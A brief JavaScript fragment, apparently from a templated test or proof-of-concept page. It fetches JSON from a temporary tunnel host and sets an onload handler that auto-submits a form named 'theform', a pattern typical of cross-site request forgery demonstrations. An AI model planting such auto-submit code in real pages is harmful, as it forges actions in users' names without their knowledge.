fetch("https://e893cfcf7343ec.lhr.life/json")
  .then((response) => response.json()) // Parse JSON from the response
  .then((data) => {
    console.log(data); // Use the data
  })
  .catch((error) => {
    console.error("Error fetching data:", error);
  });

document.onload = function() {{
  document.getElementById("theform").submit();
}};
